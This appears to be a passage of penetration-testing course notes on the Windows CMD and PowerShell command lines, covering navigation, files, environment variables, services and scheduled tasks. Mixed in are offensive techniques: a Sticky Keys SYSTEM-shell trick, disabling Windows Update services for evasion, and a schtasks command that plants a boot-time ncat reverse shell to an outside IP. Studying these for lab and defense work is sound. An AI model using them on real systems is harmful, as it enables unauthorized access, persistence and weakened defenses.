# 07_Intro_to_Windows_CLI

## Overview
Windows hosts utilize two primary command-line interfaces: **CMD.exe** (Command Prompt) and **PowerShell**. These tools provide direct access to the operating system, allowing for task automation and granular control of system configurations and applications.

From a penetration testing perspective, proficiency in these interfaces is essential for reconnaissance, exploitation, and data exfiltration within Windows environments.

## Command Prompt vs. PowerShell
While both shells provide access to the OS, they operate on different architectures. CMD is a legacy command processor, whereas PowerShell is a sophisticated task automation framework built on the .NET runtime.

### Technical Comparison

| Feature | PowerShell | Command Prompt (CMD) |
| :--- | :--- | :--- |
| **Introduced** | 2006 | 1981 |
| **Command Execution** | Batch & Cmdlets | Batch commands only |
| **Output Type** | Object-based | Text-based |
| **Pipeline** | Supports piping objects between cmdlets | Limited text-based output |
| **Environment** | Cross-platform (Windows/Linux) | Windows only |
| **Integrated Tools** | ISE (Integrated Scripting Environment) | None |
| **Framework** | .NET Framework accessible | N/A |

### Key Operational Differences
* **Interoperability:** You can execute CMD commands directly within a PowerShell session. However, to execute PowerShell cmdlets from CMD, you must invoke the interpreter explicitly (e.g., `powershell Get-Alias`).
* **Automation:** PowerShell's object-oriented pipeline allows for complex data manipulation and scripting. CMD is limited to sequential command execution, where one command must complete before the next begins.

## Lab Connectivity
This module relies on a strictly CLI-based workflow. Access to Windows targets is provisioned via SSH.

### Accessing Targets
Use the following syntax to authenticate to the provided Windows hosts:

~~~bash
ssh htb-student@<IP-Address>
~~~

# 07.1_CMD_Basics

## Overview
The Command Prompt (`cmd.exe`) is the default command-line interpreter for the Windows operating system. While often considered a legacy tool compared to PowerShell, it remains a critical component for both system administration and penetration testing due to its ubiquity and lower resource consumption.

## Why CMD Matters in Pentesting
Proficiency in `cmd.exe` is essential when modern automation tools are restricted. During engagements, you may encounter environments where PowerShell is blocked via policies such as **AppLocker**. In such scenarios, CMD provides the necessary interface to maintain access, perform reconnaissance, and conduct post-exploitation tasks.

## Access Vectors
Understanding the distinction between local and remote access is fundamental for both administrative tasks and offensive operations.

### 1. Local Access
Refers to direct interaction with the host via physical or virtual peripherals (e.g., a virtual machine console).
* **Execution Methods:**
    * **Run Prompt:** Press `Win + R` and execute `cmd`.
    * **Direct Path:** Execute `C:\Windows\System32\cmd.exe`.

### 2. Remote Access
Interaction with the host over the network, eliminating the requirement for physical proximity. 
* **Protocols:** Common methods include SSH, PsExec, WinRM, and RDP.
* **Security Consideration:** Remote management services are high-value targets. Poor configuration or weak credential management on these services allows an attacker to pivot and gain broad access to the target environment.

## Basic Navigation
CMD navigation relies on a request-response model. Navigation requires identifying your current working directory and querying the system.

* **Primary Command:** `dir`
* **Functionality:** Lists all files and subdirectories within the current path.
* **Output:** Provides metadata including timestamps, file sizes, and directory/file status. This output is plain text, which is useful for rapid parsing during manual reconnaissance.

## Case Study: Privilege Escalation via Windows Recovery
In scenarios involving user lockout or system failure, booting from installation media allows access to **Repair Mode** and the recovery Command Prompt.

### Attack Vector: Sticky Keys (`sethc.exe`)
1. **Objective:** Execute an unauthorized privilege escalation.
2. **Technique:** Within the recovery shell, replace the `sethc.exe` (Sticky Keys) binary with a copy of `cmd.exe`.
3. **Execution:** Upon rebooting to the standard login screen, trigger Sticky Keys (press `Shift` five times).
4. **Outcome:** Instead of the accessibility menu, the system launches the replaced binary (`cmd.exe`) with **`NT AUTHORITY\SYSTEM`** privileges, granting full control over the machine without valid user credentials.

*Note: This highlights the absolute necessity of full-disk encryption (e.g., BitLocker) and strict physical access controls to prevent unauthorized modification of system binaries.*

# 07_Intro_to_Windows_CLI: Command Prompt Help & Productivity

## 1. Offline Help System
In restricted environments (e.g., internal network engagements with strict firewall egress filtering), relying on external documentation is not an option. Mastering the built-in CMD help utility is essential for maintaining operational tempo during system enumeration ??(Enumeration: The process of extracting information from a target system, such as users, software versions, and network details).

### 1.1 Built-in Help
* **`help`**: Executes the general help function, listing available built-in commands with brief descriptions.
* **`help [command_name]`**: Retrieves specific syntax and functional details for a targeted command.
* **`[command_name] /?`**: The standard Windows switch to request help for a specific command. This is often more reliable than the `help` command, as some binaries do not register with the help utility.

## 2. Terminal Productivity
Operational efficiency is paramount. Use the following commands and key-bindings to manage your session output and history effectively.

### 2.1 Screen Management
* **`cls`**: Clears the current terminal buffer. Use this to maintain a clean workspace and prevent log contamination when transitioning between different enumeration tasks.

### 2.2 Command History
CMD maintains a session-based history. Unlike Bash (which uses `~/.bash_history` for persistent storage ??(Man pages: Manual pages, a standard form of documentation on Unix-like systems)), CMD history is ephemeral and wipes when the terminal instance is closed.

* **`doskey /history`**: Displays the full command history for the active session.
* **Keybindings**:
    * **Up/Down Arrows**: Navigate through historical entries.
    * **F3**: Retypes the entire previous entry to the prompt.
    * **F7**: Opens a pop-up graphical list of command history for selection.
    * **F5**: Cycles through previous commands sequentially.

### 2.3 Process Control
* **`Ctrl + C`**: Immediately interrupts the current foreground process. Essential for stopping unresponsive commands or terminating long-running network scans (e.g., `ping` sweeps) prematurely. 
    * *Warning*: Improper termination of certain binaries may cause them to hang or leave handles open. Monitor process behavior carefully.

## 3. External References
When internet access is available, prioritize high-fidelity, concise resources:
* **Microsoft Learn**: The authoritative source for command syntax and OS-level technical specifications.
* **SS64**: A highly efficient, CLI-focused reference repository for CMD, PowerShell, and Bash syntax.

# Windows System Navigation & Filesystem Enumeration

## 1. Introduction
A foundational skill for any Junior SysAdmin or Pentester is the ability to swiftly navigate the Windows filesystem via the Command Prompt (`cmd.exe`). Efficient movement and enumeration are critical for both administrative troubleshooting and attack surface mapping during an engagement. 

## 2. Directory Listing (`dir`)
The `dir` command provides a detailed list of files and subdirectories within the current working directory. It is the primary tool for initial reconnaissance of a folder's contents.

```cmd
C:\Users\htb\Desktop> dir
```
* **Usage Notes:** Executing `dir` without arguments displays the contents of the current directory, including file sizes, creation/modification dates, and directory tags (`<DIR>`). Use `dir /?` to explore advanced searching, sorting, and filtering arguments.

## 3. Navigating the Filesystem (`cd` / `chdir`)
The `cd` (Change Directory) or `chdir` command is used to identify the current working directory or navigate to a different location within the filesystem hierarchy.

* **Print Current Directory:** Executing `cd` without arguments outputs the current working path, which serves as your point of reference for all subsequent operations.
    ```cmd
    C:\htb> cd
    ```

### 3.1. Absolute vs. Relative Paths
Understanding the distinction between absolute and relative paths is imperative for agile CLI navigation.

* **Absolute Path:** Specifies the complete route starting from the root directory (e.g., `C:\`) down to the target destination. The `C:\` designation has historically represented the primary internal hard drive since the MS-DOS era.
    ```cmd
    C:\htb> cd C:\Users\htb\Pictures
    ```
* **Relative Path:** Specifies the route relative to the current working directory. It utilizes `.` (current directory) and `..` (parent directory) to traverse the hierarchy without referencing the root.
    ```cmd
    C:\htb> cd .\Pictures
    C:\Users\htb\Pictures> cd ..\..\..\
    ```
    > **Pro Tip:** The `..\..\..\` command allows for rapid upward traversal directly back to the root directory in a single execution.

## 4. Deep Filesystem Enumeration (`tree`)
To gain a comprehensive overview of the directory structure without manually traversing each folder, use the `tree` command. This is highly valuable during the reconnaissance phase to identify configuration files, project assets, or hardcoded credentials (e.g., `passwords.txt`, `secrets.txt`).

* **Directory Tree:** Lists only folders and subfolders.
    ```cmd
    C:\htb\student> tree
    ```
* **Complete Tree (Files & Folders):** Appending the `/F` switch instructs the command to display all files within each directory.
    ```cmd
    C:\htb> tree /F
    ```
    > **Warning:** This generates extensive output on populated systems. Be prepared to interrupt the execution with `Ctrl + C` or pipe the output to a file (e.g., `tree /F > fs_dump.txt`) for structured analysis.

## 5. High-Value Directories (Adversary Perspective)
During an assessment, specific Windows directories serve as strategic locations for dropping payloads, staging data, or uncovering sensitive information due to their default permission structures. 

| Environment Variable | Absolute Path | Description & Tactical Value |
| :--- | :--- | :--- |
| `%SYSTEMROOT%\Temp` | `C:\Windows\Temp` | Global temporary directory. Accessible to all users with full read, write, and execute permissions. A prime location for low-privilege payload staging. |
| `%TEMP%` | `C:\Users\<user>\AppData\Local\Temp` | User-specific temporary directory. Grants full ownership to the attached user account. Highly useful when controlling a domain-joined or local user session. |
| `%PUBLIC%` | `C:\Users\Public` | Publicly accessible directory allowing any interactive logon account full read/write/execute permissions. Often less heavily monitored for suspicious activity compared to the global Temp directory. |
| `%ProgramFiles%` | `C:\Program Files` | Contains 64-bit installed applications. Essential for software enumeration and identifying vulnerable application versions. |
| `%ProgramFiles(x86)%` | `C:\Program Files (x86)` | Contains 32-bit installed applications. Critical for complete attack surface mapping. |

# Windows CLI: Working with Directories and Files

This documentation outlines fundamental and advanced techniques for managing files and directories via the Windows Command Prompt (CMD). Mastery of these built-in binaries is critical for system administration, post-exploitation enumeration, and secure infrastructure operations.

---

## 1. Directory Enumeration & Creation

Understanding and manipulating the filesystem hierarchy is the first step in host enumeration. 

* **`dir`**: Lists the contents of the current working directory.
* **`tree /F`**: Provides a graphical, recursive listing of all directories and files within a specified path.
* **`mkdir` / `md`**: Creates a new directory.

```cmd
C:\Users\htb\Desktop> mkdir new-directory
C:\Users\htb\Desktop> md another-dir
```

## 2. Directory Deletion & Modification

### Removing Directories
* **`rd` / `rmdir`**: Deletes a directory. 
* **Targeting Non-Empty Directories**: By default, `rd` will fail if the directory contains files. Append the `/S` switch to forcefully erase the directory and all nested contents.

```cmd
C:\Users\htb\Desktop> rd /S Git-Pulls
Git-Pulls, Are you sure (Y/N)? Y
```

### Advanced Directory Manipulation
While `move` easily transfers directories and their contents from a source to a destination, `xcopy` and `robocopy` offer robust administrative and pentesting capabilities.

* **`xcopy`**: Highly useful for retaining or resetting file attributes during transfers. 
    * *Pentester Use Case*: Excellent for moving locked or system files without introducing third-party tools to the host environment.
    * `xcopy source dest /E`: Copies directories and subdirectories, including empty ones.
    * `xcopy source dest /K`: Retains source file attributes (like Read-only) on the destination.
* **`robocopy` (Robust File Copy)**: The modern successor to `xcopy`, designed for large syncs and retaining granular data (timestamps, ownership, ACLs, and hidden/read-only flags).
    * *Bypassing Attribute Restrictions*: Using the `/MIR` (Mirror) switch can occasionally bypass standard access errors, though it demands caution as it mirrors the exact state of the source (deleting destination files if they don't exist in the source).
    * *Exfiltration Tactic*: `robocopy /E /MIR /A-:SH <source> <dest>` copies the directory tree while actively stripping System (`S`) and Hidden (`H`) attributes.

---

## 3. File Enumeration & Viewing

Inspecting file contents natively without triggering locks or raising alerts is a standard procedure when hunting for plaintext credentials or sensitive configurations.

* **`type`**: Outputs the exact contents of a file to the terminal. Crucially, it **does not lock** the file during execution.
* **`more`**: Paginates large file outputs to prevent buffer overflow in the terminal.
    * `more /S <file>`: Compresses sequential blank lines into a single blank space for easier reading.
* **`openfiles`**: (Requires Administrator privileges) Displays files currently opened by local or remote users. Can forcefully disconnect sessions linked to locked files.

---

## 4. Input/Output (I/O) Redirection & Chaining

Mastering operator logic allows for complex command chaining and automated file modification on the fly.

| Operator | Function | Example |
| :--- | :--- | :--- |
| `>` | Overwrites output to a file (creates if it doesn't exist). | `ipconfig /all > details.txt` |
| `>>` | Appends output to the end of a file. | `echo "new line" >> file.txt` |
| `<` | Feeds file content as input to a command. | `find /i "password" < dump.txt` |
| `\|` (Pipe) | Passes output of Command A as input to Command B. | `ipconfig /all \| find /i "IPv4"` |
| `&` | Executes Command A, then Command B (regardless of success). | `ping 8.8.8.8 & type log.txt` |
| `&&` | Executes Command B **only if** Command A succeeds. | `cd Backup && echo "Success" > log.txt` |
| `\|\|` | Executes Command B **only if** Command A fails. | `cd Restricted \|\| echo "Access Denied"` |

---

## 5. File Creation, Modification & Deletion

### Creating & Renaming Files
* **Echo**: Quick file generation and string manipulation.
    ```cmd
    C:\> echo "Super Secret Password" > creds.txt
    ```
* **Fsutil**: Generates empty files of a specific byte size. Useful for testing disk quotas or creating payload placeholders.
    ```cmd
    C:\> fsutil file createNew payload.bin 1024
    ```
* **Rename**: `ren` or `rename` alters the file name directly. (`ren old.txt new.txt`)

### Deleting Files & Handling Attributes
* **`del` / `erase`**: Standard deletion commands. Accepts wildcards (`*`) or lists of files.
* **Force Deletion**: `del /F <file>` bypasses standard read-only blocks.
* **Attribute-Based Targeting**: Use the `/A` switch to identify and interact with protected files.
    * **Identify**: `dir /A:H` (Hidden files) or `dir /A:R` (Read-only files).
    * **Erase**: `del /A:H *` or `del /A:R *` removes files matching those specific attributes within the directory.

---

## 6. Copying & Moving Files

Standard file manipulation binaries for localized operations:

* **`copy`**: Duplicates files from source to destination. Append `/V` to validate that the new files were written correctly without corruption.
* **`move`**: Transfers files to a new directory. Unlike `copy`, `move` can also rename directories and files simultaneously during the transfer.

# Host Enumeration and System Information Gathering (Windows)

## Overview
Host enumeration is a foundational practice for both SysAdmins (diagnostics, integrity monitoring) and Penetration Testers (vulnerability assessment, privilege escalation, lateral movement). The objective is to establish comprehensive situational awareness of the target host and its environment.

## Enumeration Categories
A structured approach prevents "information overload." We categorize gathered data into four primary domains:

| Category | Description |
| :--- | :--- |
| **General System Info** | Hostname, OS version, build details, and installed hotfixes/patches. |
| **Networking Info** | IP configuration, DNS, active connections, and reachable subnets. |
| **Domain Information** | Active Directory ?? (Microsoft's directory service used for managing permissions and access in a network / Servicio de directorio de Microsoft utilizado para gestionar permisos y accesos en una red). |
| **User Information** | Local users, groups, privileges, environment variables, and running tasks. |

## Methodology
To minimize the forensic footprint and maintain efficiency, avoid arbitrary searching. Adhere to a systematic reconnaissance flow:
1.  **Analyze current standing:** Who is the user? What are their privileges?
2.  **Scope the network:** What other hosts are reachable? Where is the traffic going?
3.  **Identify pivot points:** Are there open network shares or misconfigured services?

---

## Command Reference (CMD)

### 1. General System Information
* **`systeminfo`**: Provides comprehensive host data. High utility, but "noisy" in terms of logging.
* **`hostname`**: Displays the machine name.
* **`ver`**: Prints the OS version.

### 2. Networking Enumeration
* **`ipconfig`**: Standard utility for viewing TCP/IP configuration.
    * `ipconfig /all`: Verbose output (MAC address, DHCP status, DNS servers).
* **`arp /a`**: Displays the ARP Cache ?? (A table containing mappings of IP addresses to physical MAC addresses / Una tabla que contiene mapeos de direcciones IP a direcciones MAC físicas). Crucial for identifying adjacent hosts in the network.

### 3. User & Privilege Analysis
* **`whoami`**: Essential for identifying the current session context.
    * `whoami /priv`: Displays current security privileges (critical for identifying escalation paths).
    * `whoami /groups`: Lists all group memberships (SIDs/Attributes).
* **`net user`**: Lists user accounts defined on the local host.
* **`net localgroup`**: enumerates local groups to identify potential access vectors (e.g., "Administrators", "Remote Desktop Users").

### 4. Resource & Share Enumeration
* **`net share`**: Lists available network shares. Essential for finding sensitive files or staging areas.
* **`net view`**: Displays resources (shares, printers) on the domain/network.

---

## Critical Considerations for Penetration Testing
While these commands are standard, they generate audit logs. In mature environments, rely on these tools cautiously, as the use of `net *` commands is often a primary indicator of compromise (IoC) monitored by EDR/NIDS ?? (Endpoint Detection and Response / Network Intrusion Detection System - Advanced security monitoring tools / Herramientas avanzadas de monitoreo de seguridad para endpoints y detección de intrusiones en red).

*Note: As a standard user, execution of these tools in a production environment should be handled with extreme care to avoid triggering SIEM alerts or incident response workflows.*


## Windows CLI: File Enumeration, Comparison, and Data Sorting

Effective file system enumeration is a critical skill for both System Administration and Penetration Testing. It allows for the identification of sensitive files, configuration changes, and potential attack vectors.

### 1. File Enumeration
Locating binaries and specific files within the filesystem is the first step in reconnaissance and system auditing.

#### Using `where`
The `where` command displays the location of files that match a search pattern. By default, it searches directories specified in the system's PATH environment variable.

* Standard Search: Searches within the system PATH.
    where calc.exe

* Recursive Search (/R): Used to search entire directory trees when the target is outside the system PATH (e.g., user profiles).
    where /R C:\Users\student\ bio.txt

* Wildcard Usage: Supports globbing for flexible searching.
    where /R C:\Users\student\ *.csv

#### Searching within files: `find` vs `findstr`
* `find`: Used for simple string matching. It lacks robust pattern support but is fast for quick text searches.
    * /V: Displays all lines *not* containing the specified string.
    * /N: Displays line numbers.
    * /I: Ignores case sensitivity.
    find /N /I /V "IP Address" example.txt

* `findstr`: A more powerful utility designed for complex pattern matching and Regular Expressions (Regex). Consider this the Windows equivalent of Linux's `grep`.
    findstr "search_pattern" filename

---

### 2. File Evaluation and Comparison
When auditing systems (e.g., checking for modified configuration files or unauthorized changes), we use comparison utilities to detect differences.

#### `comp` (Byte-level comparison)
Compares files byte-by-byte. Best suited for verifying binary integrity or detecting minor character changes.
* /A: Displays differences in ASCII format rather than decimal.
* /L: Includes line numbers in the output.

#### `fc` (File Compare - Line-level comparison)
A more robust tool than `comp`. `fc` compares files and reports line-by-line differences, making it ideal for text files, scripts, and logs.
* /N: Displays line numbers.
* /C: Case-insensitive comparison.
* /U: Compares files as Unicode text.
* /W: Compresses white space (tabs/spaces) to avoid false positives during comparison.

*Example:*
    fc passwords.txt modded.txt /N

---

### 3. Data Sorting
The `sort` command reads input from files or pipelines, sorts the data, and outputs to the console or a file.

* Redirection (/O): Writes the sorted output to a specified file.
* Unique (/unique): Filters out duplicate entries, displaying only unique lines.

*Example: Sorting a file and filtering unique entries*
    sort.exe .\file-1.md /O .\sorted.md
    sort.exe .\sorted.md /unique

# Windows Environment Variables

Environment variables are global or local configuration settings applied to a host. They dictate how applications and scripts interact with the Operating System, reference data, and locate executables. 

In Windows environments, these variables are **not case-sensitive**, can include spaces or numbers, but **cannot start with a number or contain an equal sign (`=`)**. 

Standard system variables are conventionally written in uppercase with underscores separating words (e.g., `%STRONG_VARIABLE%`).

---

## 1. Variable Scope & Architecture

Scope defines the context and boundaries within which a variable can be accessed or modified. Windows categorizes environment variables into three distinct scopes:



### Scope Breakdown

| Scope | Description | Permissions Required | Registry Location |
| :--- | :--- | :--- | :--- |
| **System (Machine)** | Core OS variables loaded at runtime. Globally accessible by all users and system accounts. | Local Administrator / Domain Admin | `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` |
| **User** | Variables defined for and isolated to the currently active user session. | Current Active User / Local Admin / Domain Admin | `HKCU\Environment` |
| **Process** | Volatile, transient sub-scope variables defined within a running process. Inherits from System/User scopes. | Current Process / Parent Process | None (Stored strictly in volatile Process Memory) |

---

## 2. Global vs. Local Variables (Technical Demonstration)

### Global Variables
Global variables are accessible system-wide across concurrent sessions. For instance, both users `alice` and `bob` can query the built-in global variable `%WINDIR%`:

```cmd
C:\Users\alice> echo %WINDIR%
C:\Windows

C:\Users\bob> echo %WINDIR%
C:\Windows
```

### Local Variables
Local variables are volatile and constrained to the process or CLI session where they were instantiated. If `alice` declares a local variable, it remains completely isolated from `bob`'s context:

```cmd
C:\Users\alice> set SECRET=HTB{5UP3r_53Cr37_V4r14813}
C:\Users\alice> echo %SECRET%
HTB{5UP3r_53Cr37_V4r14813}

C:\Users\bob> echo %SECRET%
%SECRET%

C:\Users\bob> set %SECRET%
Environment variable %SECRET% not defined
```

---

## 3. CLI Management: `set` vs. `setx`

Managing environment variables efficiently from the Command Prompt requires understanding the operational lifetime of the utilities used.

* **`set`**: Manipulates variables strictly within the **current CLI session** (Process Scope). Closing the terminal destroys these changes.
* **`setx`**: Writes changes directly to the **Windows Registry** (User or System Scope), ensuring permanence across reboots and new sessions.

### Utility Mechanics

#### Viewing Variables
To dump all active variables, execute `set`. To print a specific variable's literal value, utilize `echo`:

```cmd
C:\Users\htb> echo %PATH%
C:\Users\htb\Desktop
```

#### Creating & Updating Variables
When using `set`, use the assignment operator (`=`). When using `setx`, use space-separated parameters (`setx <variable_name> <value>`).

```cmd
:: Session-scoped allocation (Temporary)
C:\htb> set DCIP=172.16.5.2
C:\htb> echo %DCIP%
172.16.5.2

:: Persistent allocation via Registry injection
C:\htb> setx DCIP 172.16.5.2
SUCCESS: Specified value was saved.

:: Modifying an existing persistent variable
C:\htb> setx DCIP 172.16.5.5
SUCCESS: Specified value was saved.
```
> **Note:** Changes made via `setx` will not track in the *current* terminal window; they require spawning a new command prompt session or a new logon session to take effect.

#### Removing Variables
Variables cannot be explicitly deleted; instead, they are purged by resetting their values to null (`""`).

```cmd
C:\htb> setx DCIP ""
SUCCESS: Specified value was saved.

:: Verification in a new session
C:\htb> set DCIP
Environment variable DCIP not defined
```

---

## 4. High-Value Target Variables for Reconnaissance

From an offensive and defensive assessment perspective, environment variables expose a wealth of clear-text architectural data during host enumeration.

| Variable Name | Technical Intel & Description |
| :--- | :--- |
| **`%PATH%`** | Directories searched for executable binaries. Crucial for binary hijacking and DLL hijacking vectors. |
| **`%OS%`** | Exposes the baseline operating system running on the host workstation. |
| **`%SYSTEMROOT%`** | Points to `C:\Windows`. Houses core binaries, configurations, and critical OS subsystems. |
| **`%LOGONSERVER%`** | Returns the authenticating hostname (e.g., Domain Controller). Identifies if the host is domain-joined. |
| **`%USERPROFILE%`** | Maps to `C:\Users\{username}`. Speeds up targeting of user directories, SSH keys, and local data. |
| **`%ProgramFiles%`** | Path to 64-bit application installations (`C:\Program Files`). |
| **`%ProgramFiles(x86)%`** | Path to 32-bit applications running under WOW64. Its presence confirms a 64-bit architecture. |

# Windows Service Management and Enumeration

## Overview
Monitoring and controlling services on a host is an essential responsibility for a systems administrator and a critical capability for an attacker during post-exploitation. Interrogating services allows operators to discover privilege escalation vectors, establish persistence, or disable defensive mechanisms like antivirus software.

---

## The Service Controller (`sc.exe`)
The `sc.exe` utility is a native Windows command-line program that communicates directly with the **Service Control Manager (SCM)**. It allows for local and remote service interrogation, configuration modification, and state management.

### Basic Usage and Help Context
Running `sc` without parameters displays the tool's description, syntax options, and operational commands.

    C:\htb> sc

### Service Enumeration
To list active Win32 services on the target system, utilize the `query` command filtered by `type= service`.

> **Critical Syntax Note:** The space after the equal sign (`=`) is mandatory for `sc.exe` to parse the argument properly (e.g., `type= service`). Alternate spacings like `type=service` or `type =service` will fail.

    C:\htb> sc query type= service

### Targeting Defensive Controls (Windows Defender)
Auditing host defenses is a priority upon initial access. Operators can query the status of the Windows Defender service (`windefend`) to verify its execution state.

    C:\htb> sc query windefend

* **Privilege Restrictions:** Standard, non-elevated users lack the permissions required to stop or pause critical services, resulting in an `Access is denied` error.
* **Protected Processes:** Certain native security services, such as `windefend`, are protected against tampering even from local administrative accounts. They accept control requests exclusively from the **SYSTEM** account. Attempting to force-stop these processes blindly will fail and generate significant security event log telemetry, alerting the Blue Team.

    C:\WINDOWS\system32> sc stop windefend
    Access is denied.

### Controlling Service States
When operating within an elevated context (Local Administrator), secondary or non-protected services can be stopped or started to manipulate system behavior. For instance, the Print Spooler service (`Spooler`) can be toggled as follows:

#### Querying the Target Service
    C:\WINDOWS\system32> sc query Spooler

#### Issuing a Stop Control Request
    C:\WINDOWS\system32> sc stop Spooler

#### Issuing a Start Control Request
    C:\WINDOWS\system32> sc start Spooler

---

## Modifying Service Configuration
The `config` parameter allows administrators and attackers to modify service parameters persistently within the Windows Registry and the SCM database. Changes to an active service's configuration require a service restart to take effect.

> **Operational Warning:** Modifications to service configurations (such as altering the binary path or startup type) persist across reboots. Operators must exercise caution to prevent permanent system instability.

### Defensive Evasion Case Study: Disabling Windows Updates
Modern Windows systems (Version 10 and above) rely on multiple cooperative services for update management, primarily `wuauserv` (Windows Update Service) and `bits` (Background Intelligent Transfer Service). Disabling these ensures the host remains unpatched, preserving older vulnerabilities.

#### 1. Terminate the Active Service Instances
    C:\WINDOWS\system32> sc stop bits

#### 2. Persistent Modification of Startup Type to Disabled
    C:\WINDOWS\system32> sc config wuauserv start= disabled
    [SC] ChangeServiceConfig SUCCESS

    C:\WINDOWS\system32> sc config bits start= disabled
    [SC] ChangeServiceConfig SUCCESS

#### 3. Verification of Disabled State
Attempts to manually restart the services will fail with SCM Error 1058:
    C:\WINDOWS\system32> sc start wuauserv
    [SC] StartService FAILED 1058:
    The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.

> **Operational Rollback:** To revert these modifications and restore default behavior, reset the startup type to automatic: `sc config <service_name> start= auto`.

---

## Alternative Service Enumeration Utilities

### 1. Tasklist
The `tasklist` utility paired with the `/svc` flag maps active Process Identifiers (PIDs) to their respective hosted services. This is highly effective for identifying which specific `svchost.exe` instance is running a target service.

    C:\htb> tasklist /svc

### 2. Net Utility
A legacy administrative tool used to list active services or execute state toggles (`net start`, `net stop`, `net pause`, `net continue`). Running `net start` without arguments outputs all currently running services.

    C:\htb> net start

### 3. Windows Management Instrumentation Command-Line (`wmic`)
The `wmic service` component allows operators to pull structured attributes including `Name`, `ProcessId`, `StartMode`, and `State`.

    C:\htb> wmic service list brief

> **Note:** `wmic` is formally deprecated in modern Windows builds. Operators should pivot to PowerShell equivalents (`Get-Service` or `Get-CimInstance`) when operational constraints allow.

---

## Next Steps
Interacting with Windows services via the command line is foundational for non-GUI post-exploitation and privilege escalation. Understanding how these components behave under different integrity levels ensures cleaner execution and better operational security. The subsequent sections will address the PowerShell equivalents of these commands and transition into Windows Scheduled Tasks.


# Working with Scheduled Tasks (`schtasks.exe`)

Scheduled tasks are a fundamental Windows feature used by System Administrators for automation, but they also serve as a highly effective **persistence mechanism** for attackers. The Task Scheduler monitors the host for specific conditions (triggers) and executes predefined actions once those conditions are met.

## Red Teaming Context: Persistence Strategy

During enterprise engagements, once initial access is achieved, `schtasks` provides a stealthy method to establish persistence. Instead of dropping conspicuous executables that might trigger AV/EDR solutions, a scheduled task can be configured to execute a reverse shell (e.g., via PowerShell or `ncat.exe`) upon user logon or system reboot. If executed successfully under a privileged account context, this can also facilitate concurrent privilege escalation (e.g., catching a `SYSTEM` shell).

### Common Execution Triggers
Tasks can be triggered based on various system events, including:
* System boot (`ONSTART`)
* User logon (`ONLOGON`)
* Specific time/date schedules (Daily, Weekly, Monthly)
* System idle state (`ONIDLE`)
* Terminal Server session state changes

---

## Command Reference: `schtasks`

The `schtasks` utility allows for command-line management of scheduled tasks. Below is the operational syntax for querying, creating, modifying, and deleting tasks. *Note: Always check `schtasks /?` for the complete parameter list.*

### 1. Enumeration: `schtasks /query`
Performs a local or remote host search to enumerate existing scheduled tasks. Output visibility is dependent on the execution privileges.

| Parameter | Description |
| :--- | :--- |
| `/fo` | Output format. Valid values: `TABLE`, `LIST`, `CSV`. |
| `/v` | Verbose mode. Displays advanced properties (use with `LIST` or `CSV`). |
| `/nh` | No Header. Suppresses column headers in `TABLE` or `CSV` formats. |
| `/s` | Target remote host (Format: `\\hostname` or IP). Defaults to `localhost`. |
| `/u` & `/p` | Specifies the user context and password for remote execution (Requires Admin privileges). |

**Example: Querying a specific task with verbose list output**
```cmd
C:\htb> SCHTASKS /Query /TN "\Check Network Access" /V /FO list

Folder: \  
HostName:                             DESKTOP-Victim
TaskName:                             \Check Network Access
Status:                               Ready
Logon Mode:                           Interactive only
Author:                               DESKTOP-Victim\htb-admin
Task To Run:                          C:\Windows\System32\cmd.exe ping 8.8.8.8
Scheduled Task State:                 Enabled
Run As User:                          tru7h
Schedule Type:                        At system start up
```

### 2. Persistence: `schtasks /create`
Schedules a new task. This is the primary method for establishing scheduled callback mechanisms.

| Parameter | Description |
| :--- | :--- |
| `/sc` | Schedule type (e.g., `MINUTE`, `HOURLY`, `DAILY`, `ONSTART`, `ONLOGON`). |
| `/tn` | Task Name (Must be unique). |
| `/tr` | Task Run. The binary, script, or command to execute. |
| `/ru` | Run As User. The user account context to run the task under. |
| `/rp` | Run As Password. The password for the specified user. |
| `/rl` | Run Level. Privileges for the task (`LIMITED` or `HIGHEST`). |
| `/z`  | Mark task for deletion after its final run. |

**Example: Creating an `ONSTART` reverse shell callback**
Creates a persistent callback utilizing a dropped `ncat.exe` payload that executes on every system boot.
```cmd
C:\htb> schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"

SUCCESS: The scheduled task "My Secret Task" has successfully been created.
```

### 3. Modification: `schtasks /change`
Modifies the properties of an existing task. Useful for lateral movement or privilege escalation if administrative credentials have been compromised.

| Parameter | Description |
| :--- | :--- |
| `/tn` | Identifies the Target Task to modify. |
| `/tr` | Modifies the program/action to execute. |
| `/ru` & `/rp`| Updates the execution credentials. |
| `/ENABLE` | Enables the task. |
| `/DISABLE`| Disables the task. |

**Example: Elevating task execution context to Administrator**
```cmd
C:\htb> schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"

SUCCESS: The parameters of scheduled task "My Secret Task" have been changed.
```
*Note: You can verify these changes by re-running the `/query` command for the specific `/tn` to check the updated `Run As User` attribute (e.g., now running as `SYSTEM`).*

### 4. Cleanup: `schtasks /delete`
Removes the scheduled task from the system. Crucial for the post-engagement cleanup phase to avoid leaving rogue artifacts.

| Parameter | Description |
| :--- | :--- |
| `/tn` | Identifies the Target Task to delete. |
| `/f` | Force deletion. Suppresses the interactive confirmation prompt. |

**Example: Forcing deletion of the persistence artifact**
```cmd
C:\htb> schtasks /delete /tn "My Secret Task" /f

SUCCESS: The scheduled task "My Secret Task" was successfully deleted.
```
# CMD vs. PowerShell: The Modern CLI Paradigm

While the legacy Windows Command-Line Interpreter (`cmd.exe`) has been a staple for decades, modern Windows administration and penetration testing demand a more robust framework. This module explores PowerShell, detailing its fundamental differences from CMD, help system navigation, directory traversal, and operational efficiency tips.

## Core Differences: PowerShell vs. CMD

PowerShell and CMD are both native to Windows environments, but their underlying architectures and capabilities differ significantly. 

| Feature | CMD (`cmd.exe`) | PowerShell (`powershell.exe`) |
| :--- | :--- | :--- |
| **Language Support** | Limited to Batch and legacy CMD commands. | Interprets Batch, CMD, native PS cmdlets, and aliases. |
| **Command Utilization** | Output cannot be passed directly into another command as a structured object (limited to text parsing). | Pipeline output is passed as structured .NET objects, enabling complex data manipulation. |
| **Output Format** | Plain text only. | Object-oriented formatting. |
| **Execution Flow** | Strictly sequential execution. | Supports multi-threading and parallel job execution. |

PowerShell transcends the traditional CLI definition; it is a full-fledged automation framework and scripting language. Built on the .NET framework, its open-source evolution has expanded its footprint to Linux and macOS environments.

## The Strategic Value of PowerShell 

